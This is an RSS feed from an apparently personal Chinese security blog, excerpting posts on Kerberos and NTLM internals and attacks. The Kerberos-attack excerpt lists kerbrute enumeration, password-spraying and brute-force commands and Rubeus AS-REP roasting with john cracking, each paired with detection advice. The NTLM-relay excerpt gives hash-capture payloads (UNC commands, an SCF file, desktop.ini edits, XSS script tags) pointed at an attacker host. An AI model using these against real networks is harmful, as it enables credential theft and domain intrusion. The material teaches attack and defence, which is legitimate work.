<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>windows协议 on mrlxl的知识库</title>
    <link>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/</link>
    <description>Recent content in windows协议 on mrlxl的知识库</description>
    <generator>Hugo</generator>
    <language>en-US</language>
    <lastBuildDate>Thu, 11 Dec 2025 00:00:00 +0800</lastBuildDate>
    <atom:link href="https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>kerberos攻击专题</title>
      <link>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/kerberos%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/kerberos%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/</guid>
      <description>&lt;h1 id=&#34;kerberos攻击专题&#34;&gt;kerberos攻击专题&lt;/h1&gt;&#xA;&lt;p&gt;由于kerberos协议认证的基础流程前面文章已经详细解释了，这里就直接进入攻击阶段&lt;/p&gt;&#xA;&lt;p&gt;总的来看kerberos可以归结于两个字：票据，前面提到了各阶段的安全问题：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240621224306896-1548204939.png&#34; alt=&#34;image-20240621224304346&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;as-req阶段&#34;&gt;AS-REQ阶段&lt;/h3&gt;&#xA;&lt;h4 id=&#34;域内用户名枚举&#34;&gt;域内用户名枚举&lt;/h4&gt;&#xA;&lt;p&gt;AS-REQ中的cname表示请求的用户名，用户名是否存在会影响返回包的内容，因此可以进行域内用户名枚举&lt;/p&gt;&#xA;&lt;h5 id=&#34;方法&#34;&gt;方法&lt;/h5&gt;&#xA;&lt;p&gt;可以使用kerbrute进行枚举：&#xA;使用编译好的工具，我们能够在一台不在域内（即域外）的机器上和DC进行通信的机器上枚举域内用户：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerbrute_windows_amd64.exe userenum --dc 192.168.111.100 -d yuy0ung.com user.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250109213426373.png&#34; alt=&#34;image-20250109213426373&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当然还有python脚本https://github.com/3gstudent/pyKerbrute&lt;/p&gt;&#xA;&lt;p&gt;msf上也有&lt;code&gt;kerberos_enumusers&lt;/code&gt;模块&lt;/p&gt;&#xA;&lt;h5 id=&#34;检测与防御&#34;&gt;检测与防御&lt;/h5&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;流量：检测同一IP短时间内是否发送了大量的AS-REQ包&lt;/li&gt;&#xA;&lt;li&gt;日志：默认情况下，对于不存在的用户名发起的AS-REQ包不会有任何记录（记录需要更改组策略），所以日志层面不好检测&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;密码喷洒&#34;&gt;密码喷洒&lt;/h4&gt;&#xA;&lt;p&gt;而用户名存在时，密码的正确与否也会影响返回包，这里虽然可以进行密码爆破，但连续针对同一账户的密码猜测很有可能会导致账户被锁定，因此有了密码喷洒喷洒攻击：即在猜解密码时，使用每个密码去尝试所有用户名&lt;/p&gt;&#xA;&lt;h5 id=&#34;方法-1&#34;&gt;方法&lt;/h5&gt;&#xA;&lt;p&gt;该攻击同样可以在域外进行，但并不支持kerberos&lt;/p&gt;&#xA;&lt;p&gt;可以使用kerbrute进行喷洒：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerbrute_windows_amd64.exe passwordspray --dc 192.168.111.100 -d yuy0ung.com user.txt Admin123456&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250109214210923.png&#34; alt=&#34;image-20250109214210923&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当然，如果域没有密码锁定策略，可以直接对单个用户进行爆破：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerbrute_windows_amd64.exe bruteuser --dc 192.168.111.100 -d yuy0ung.com user.txt pass.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;检测与防御-1&#34;&gt;检测与防御&lt;/h5&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;流量：检测同一IP短时间内是否发送了大量的AS-REQ包&lt;/li&gt;&#xA;&lt;li&gt;日志：登录成功会产生日志4768，且结果代码为0x0，登录失败日志不做记录&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;as-rep阶段&#34;&gt;AS-REP阶段&lt;/h3&gt;&#xA;&lt;h4 id=&#34;as-rep-roasting&#34;&gt;AS-REP Roasting&lt;/h4&gt;&#xA;&lt;p&gt;对于域用户，如果设置了选项”不要求kerberos域身份验证”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP请求enc-part的cipher进行组合解密就能获得用户的明文。（enc-part底下的cipher，这部分是使用用户hash加密session-key)&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250109215421485.png&#34; alt=&#34;image-20250109215421485&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;方法-2&#34;&gt;方法&lt;/h5&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;获取Hash&lt;/p&gt;&#xA;&lt;p&gt;可以使用Rbeus自动搜索满足条件的用户，并获取login session key：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rubeus.exe asreproast /format:john /outfile:hash.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;再使用john进行离线破解即可：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;john --wordlist=/opt/pass.txt hash.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h5 id=&#34;检测与防御-2&#34;&gt;检测与防御&lt;/h5&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;检测域中是否设置了“不要求kerberos域身份验证”，如果存在及时关闭&lt;/li&gt;&#xA;&lt;li&gt;日志：重点关注事件ID为4768且预身份验证类型为“不要求kerberos域身份验证”属性用户发起的Kerberos认证&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;黄金票据攻击&#34;&gt;黄金票据攻击&lt;/h4&gt;&#xA;&lt;p&gt;在AS-REP阶段，返回的TGT的加密部分是由krbtgt用户的密钥加密的，因此，如果我们获得了krbtgt的密钥，我们就可以自己制作一个TGT，该票据被称为黄金票据&lt;/p&gt;</description>
    </item>
    <item>
      <title>NTLM Relay专题</title>
      <link>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/ntlm-relay%E4%B8%93%E9%A2%98/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/ntlm-relay%E4%B8%93%E9%A2%98/</guid>
      <description>&lt;h1 id=&#34;ntlm-relay专题&#34;&gt;NTLM Relay专题&lt;/h1&gt;&#xA;&lt;p&gt;NTLM协议和NTLM Relay的相关概念已经在之前的文章中介绍过了， 这里直接从相关攻击方法以及步骤开始&lt;/p&gt;&#xA;&lt;h3 id=&#34;发起并截获ntlm请求&#34;&gt;发起并截获NTLM请求&lt;/h3&gt;&#xA;&lt;p&gt;消息传输依赖使用NTLM认证的上层协议，比如SMP、LDAP、HTTP、MSSQL，只要是使用这些上层协议的应用程序都可以发起NTLM请求，而我们可以使用responder拦截NTLM认证请求获取net-HTLM hash：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118172157425.png&#34; alt=&#34;image-20250118172157425&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;responder：&lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;Releases · SpiderLabs/Responder&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;常用方法&#34;&gt;常用方法&lt;/h4&gt;&#xA;&lt;p&gt;通常通过设置指向恶意服务器的UNC路径，使目标主机自动向恶意服务器发起HTLM认证，方法如下：&lt;/p&gt;&#xA;&lt;h5 id=&#34;系统命令&#34;&gt;系统命令&lt;/h5&gt;&#xA;&lt;p&gt;使用能传入UNC路径的命令，比如：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; \\192.168.111.130\share&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use \\192.168.111.130\share&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样的命令还有很多，当我们发起认证responder即可成功截取net-NTLM hash v2：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118172403764.png&#34; alt=&#34;image-20250118172403764&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;desktopini&#34;&gt;desktop.ini&lt;/h5&gt;&#xA;&lt;p&gt;windows系统下有个隐藏文件desktop.ini，用于指定和存储文件夹图标之类的个性化设置，这里面的iconresource是文件夹的图标路径，可以改为指向恶意服务器的UNC，那么当主机请求图标资源时，即可截获htlm hash：&lt;/p&gt;&#xA;&lt;p&gt;例如我将music文件夹的desktop.ini更改：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118175004480.png&#34; alt=&#34;image-20250118175004480&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;只要显示时请求图标即可截获htlm hash：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118175110244.png&#34; alt=&#34;image-20250118175110244&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;scf文件&#34;&gt;SCF文件&lt;/h5&gt;&#xA;&lt;p&gt;这是文件资源管理器命令文件，也是一个可执行文件，文件中的IconFile属性可以指定UNC路径，文件资源管理器会加载这个属性指定的文件图标，那么和上面同理：&lt;/p&gt;&#xA;&lt;p&gt;在任意文件夹下创建test.scf文件：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[shell]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Command=2&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IconFile=\\192.168.111.130\share\test.ico&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Taskbar]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Command=ToggleDesktop&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用户访问该文件夹就会自动请求服务器，导致htlm hash被截获：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250118195649719.png&#34; alt=&#34;image-20250118195649719&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;文档类文件&#34;&gt;文档类文件&lt;/h5&gt;&#xA;&lt;p&gt;PDF规范允许GoTobe和GoToR条目加载远程内容，测试人员可以在PDF中插入UNC路径，如果用户使用adobe reader打开pdf，则会发起HTLM请求&lt;/p&gt;&#xA;&lt;p&gt;可以使用github上的badpdf进行生成恶意的PDF，这里不做赘述&lt;/p&gt;&#xA;&lt;p&gt;该方法局限性很高，必须使用adobe reader才会触发NTLM认证&lt;/p&gt;&#xA;&lt;p&gt;当然office也有类似的方法，可以学习一下&lt;/p&gt;&#xA;&lt;h5 id=&#34;打印机&#34;&gt;打印机&lt;/h5&gt;&#xA;&lt;p&gt;Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。&lt;/p&gt;&#xA;&lt;p&gt;任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。&lt;/p&gt;&#xA;&lt;p&gt;通过脚本&lt;a href=&#34;https://github.com/topotam/PetitPotam&#34;&gt;PetitPotem&lt;/a&gt;可以让目标机器强制回连&lt;/p&gt;&#xA;&lt;p&gt;但是由于机器版本问题，使用printerbug很可能出问题(函数调用问题)，可以使用&lt;a href=&#34;https://github.com/p0dalirius/Coercer&#34;&gt;Coercer&lt;/a&gt;进行函数fuzz测试，比较好用&lt;/p&gt;&#xA;&lt;h4 id=&#34;web层面的利用&#34;&gt;web层面的利用&lt;/h4&gt;&#xA;&lt;h5 id=&#34;xss&#34;&gt;XSS&lt;/h5&gt;&#xA;&lt;p&gt;使用src标签请求恶意服务器发起NTLM认证&lt;/p&gt;&#xA;&lt;p&gt;如果用UNC路径：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;\\192.168.111.130\xss&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种情况适用于IE和edge，能够直接截获ntlm hash&lt;/p&gt;&#xA;&lt;p&gt;如果通过http：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//192.168.30.130/xss&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样的标签访问页面会弹出认证框，需要用户登录后才能截获htlm hash&lt;/p&gt;&#xA;&lt;h5 id=&#34;文件包含&#34;&gt;文件包含&lt;/h5&gt;&#xA;&lt;p&gt;同理了，文件包含函数支持解析UNC路径&lt;/p&gt;&#xA;&lt;p&gt;当然，XXE、SSRF都可以尝试这样利用&lt;/p&gt;</description>
    </item>
    <item>
      <title>Windows协议之Kerberos</title>
      <link>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/windows%E5%8D%8F%E8%AE%AE%E4%B9%8Bkerberos/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/windows%E5%8D%8F%E8%AE%AE%E4%B9%8Bkerberos/</guid>
      <description>&lt;h1 id=&#34;windows协议之kerberos&#34;&gt;Windows协议之Kerberos&lt;/h1&gt;&#xA;&lt;p&gt;Kerberos协议一种网络身份验证协议，是一种在开放的非安全网络中认证并识别用户身份信息的方法，旨在使用密钥加密技术为客户端/服务端提供应用程序提供强身份验证&lt;/p&gt;&#xA;&lt;p&gt;Kerberos本来是西方神话中守卫地狱之门的三头犬的名字，之所以使用这个名字，是因为该协议需要三方共同参与才能完成一次认证。&lt;/p&gt;&#xA;&lt;p&gt;目前主流使用的Kerberos版本为2005年RFC4120**(&lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc4120.html&#34;&gt;https://www.rfc-editor.org/rfc/rfc4120.html&lt;/a&gt;)**标准定义的KerberosV5版本，&lt;strong&gt;Windows、Linux和Mac OS均支持Kerberos协议&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;一kerberos基础&#34;&gt;一、Kerberos基础&lt;/h3&gt;&#xA;&lt;p&gt;在Kerberos协议中，主要有以下三个角色：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;访问服务的客户端：Kerberos客户端代表需要访问资源的用户进行操作的应用程序，例如打开文件、查询数据库或打印文档。每个Kerberos客户端在访问资源之前都会请求身份验证&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;提供服务的服务端：域内提供服务的服务端，服务端都有唯一的SPN（服务主体名称）&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;提供认证服务的KDC（Key Distribution Center，密钥分发中心）：KDC是一种网络服务，它向活动目录域内的用户和计算机提供会话票据和临时会话密钥，其服务账户为krbtgt。KDC作为活动目录域服务的一部分运行在每个域控上&lt;/p&gt;&#xA;&lt;p&gt;这里的krbtgt账户是在创建活动目录时系统自动创建的一个账户，其作用是在KDC的服务账户，其密码是系统随机生成的，无法正常登陆主机&lt;/p&gt;&#xA;&lt;p&gt;而KDC包含AS（Authentication Server，认证服务器）和TGS（Ticket Granting Server，票据授权服务器）&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Kerberos是一种基于票据（Ticket）的认证方式。客户端想要访问服务端的某个服务，首先需要购买服务端认可的ST（Service Ticket，服务票据）。通俗点说，就是客户端在访问服务前需要先买票，等待服务端验票之后才允许访问。而该票据不能直接购买，还需要一张TGT（Tiket Granting  Tiket，认购权证）。也就是说客户端在买票前还需要获得一张TGT。而ST和TGT均由KDC发放，因为KDC运行在域控上，所以TGT和ST也均由域控发放&lt;/p&gt;&#xA;&lt;p&gt;Kerberos协议使用TCP/UDP 88 端口进行认证，使用TCP/UDP 464 端口进行密码重设&lt;/p&gt;&#xA;&lt;p&gt;Kerberos协议有两个基础认证模块：AS_REQ&amp;amp;AS_REP 和 TGS_REQ&amp;amp;TGS_REP，以及微软扩展的两个认证模块S4U和PAC。S4U是微软为了实现委派而扩展的模块，分为S4u2Self和S4u2Proxy。在Kerberos最初设计的流程里只说明了如何证明客户端的真实身份，并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。微软为了解决该问题，引入了PAC（Privilige Attribute Certificate，特权属性证书）的概念&lt;/p&gt;&#xA;&lt;h3 id=&#34;二pac&#34;&gt;二、PAC&lt;/h3&gt;&#xA;&lt;p&gt;PAC包含各种授权信息、附加凭据信息、配置文件和策略信息等，例如用户所属的用户组、用户所具有的权限等。上文提到过，在最初的RFC1510规定的标准Kerberos认证过程中并没有PAC，微软在自己的产品实现的Kerberos流程中加入了PAC的概念&lt;/p&gt;&#xA;&lt;p&gt;在一个正常的kerberos认证流程中，KDC返回的TGT的ST都带有PAC，这样的好处是在以后对资源的访问中，服务端接收到客户请求的时候不再需要借助KDC提供完整的授权信息来完成对用户权限的判断，而只需要根据请求中所包含的PAC信息直接与本地资源的ACL相比较来做出裁决&lt;/p&gt;&#xA;&lt;h4 id=&#34;1pac结构&#34;&gt;1.PAC结构&lt;/h4&gt;&#xA;&lt;p&gt;PAC的顶部结构是这样的：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;typedef unsigned long ULONG;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;typedef unsigned short USHORT;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;typedef unsigned long64 ULONG64;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;typedef unsigned char UCHAR;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;typedef struct _PACTYPE {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ULONG cBuffers;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ULONG Version;                         &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    PAC_INFO_BUFFER Buffers[1];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;} PACTYPE;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;各字段含义:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;cBuffers：包含数组缓冲区中的条目数&lt;/li&gt;&#xA;&lt;li&gt;Version：版本&lt;/li&gt;&#xA;&lt;li&gt;Buffers：包含一个PAC_INFO_BUFFER结构的数组&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;而PAC_INFO_BUFFER结构包含关于每个部分的信息，非常重要：&lt;/p&gt;</description>
    </item>
    <item>
      <title>Windows协议之NTLM</title>
      <link>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/windows%E5%8D%8F%E8%AE%AE%E4%B9%8Bntlm/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/windows%E5%8D%8F%E8%AE%AE%E4%B9%8Bntlm/</guid>
      <description>&lt;h1 id=&#34;windows协议之ntlm&#34;&gt;Windows协议之NTLM&lt;/h1&gt;&#xA;&lt;p&gt;NTLM协议（New Technology LAN Manager）协议是微软用于&lt;strong&gt;Windows身份验证&lt;/strong&gt;的主要协议之一&lt;/p&gt;&#xA;&lt;p&gt;早期SMB协议以明文口令的形式在网络上传递，存在安全性问题，进而出现了LM（LAN manager）协议，然而该协议因为太简单，还是容易被破解，微软进而提出了NTLM协议&lt;/p&gt;&#xA;&lt;p&gt;NTLM协议既可用于工作组环境中的机器身份验证，又可用于域环境身份验证，还可以为 SMB、HTTP、LDAP、SMTP 等上层微软应用提供身份验证&lt;/p&gt;&#xA;&lt;p&gt;值得一提的是：NTLM是底层的认证协议，必须嵌入上层应用协议中，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP等&lt;/p&gt;&#xA;&lt;h3 id=&#34;一sspi与ssp的概念&#34;&gt;一、SSPI与SSP的概念&lt;/h3&gt;&#xA;&lt;h5 id=&#34;1sspi&#34;&gt;1.SSPI&lt;/h5&gt;&#xA;&lt;p&gt;SSPI（Security Service Provider Interface，安全服务提供接口）是windows定义的一套接口，该接口定义了与安全有关的功能函数，包含但不限于：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;身份验证机制&lt;/li&gt;&#xA;&lt;li&gt;为其他协议提供的session security（会话安全）机制，会话安全可为通信提供数据的完整性校验以及数据的加密、解密功能&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;注意：SSPI只是定义了一套接口函数，并没有实现具体内容&lt;/p&gt;&#xA;&lt;h5 id=&#34;2ssp&#34;&gt;2.SSP&lt;/h5&gt;&#xA;&lt;p&gt;SSP（Security Service Provider，安全服务提供者）是SSPI的实现者，微软自己实现了很多SSP，用于提供安全功能，例如：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;NTLM SSP：Windows NT 3.51中引入（msv1_0.dll），为Windows 2000之前的客户端-服务器域和非域身份验证（SMB/CIFS）提供 NTLM 质询/响应身份验证&lt;/li&gt;&#xA;&lt;li&gt;Kerberos SSP：Windows 2000中引入，Windows vista中更新为支持AES（kerberos.dll），Windows 2000及更高版本中首选的客户端-服务器域相互身份验证&lt;/li&gt;&#xA;&lt;li&gt;Digest SSP：Windows XP中引入（wdigest.dll），在 Windows 与 kerberos 不可用的非Windows系统间提供基于 HTTP 和 SASL 身份验证的质询/响应&lt;/li&gt;&#xA;&lt;li&gt;Negotiate SSP:Windows 2000 中引入（secur32.dll) ，默认选择 Kerberos，如果不可用则选择 NTLM 协议。Negotiate SSP 提供单点登录能力，有时称为集成 Windows 身份验证（尤其是用于 IIS 时)。在 Windows 7 及更高版本中，NEGOExts 引入了协商使用客户端和服务器上 支持的已安装定制 SSP 进行身份验证&lt;/li&gt;&#xA;&lt;li&gt;Cred SSP:Windows Vista 中引入，Windows XP SP3 上也可用 （credssp.dll)，为远程桌面连接提供单点登录（SSO)和网络级身份验证&lt;/li&gt;&#xA;&lt;li&gt;Schannel SSP:Windows 2000 中引入（Schannel.dll)，Windows Vista 中 更新为支持更强的 AES 加密和 ECC[6] 该提供者使用 SSL/TLS 记录来加密数据有效载荷&lt;/li&gt;&#xA;&lt;li&gt;PKU2U SSP:Windows 7 中引入（pku2u.dll) ， 在不隶属域的系统之间提供使用数字证书的对等身份验证&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;因为SSPI中定义了与session security有关的API，所以上层应用利用任何SSP与远程的服务进行身份验证后，此SSP都会为本次连接生成一个随机key，这个key被称为session 